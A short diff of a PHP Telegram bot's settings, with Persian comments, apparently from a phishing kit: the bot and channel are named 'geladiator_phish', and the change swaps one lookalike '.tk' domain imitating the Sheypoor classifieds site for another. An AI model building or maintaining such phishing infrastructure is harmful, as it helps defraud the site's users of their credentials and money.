@@ -104,7 +104,7 @@ $channel = "@geladiator_phish"; // آیدی کانال همراه @
 $admins = [1089011576]; // آیدی عددی ادمین
 $admin = 1089011576;
 $botid = "geladiator_phish"; // آیدی کانال بدون @
-$url = "https://sheypoorr.tk"; // آدرس پوشه سورس 
+$url = "https://sheypoorrr.tk"; // آدرس پوشه سورس 
 //==============================
 $update = json_decode(file_get_contents("php://input"));
 $message = $update->message;
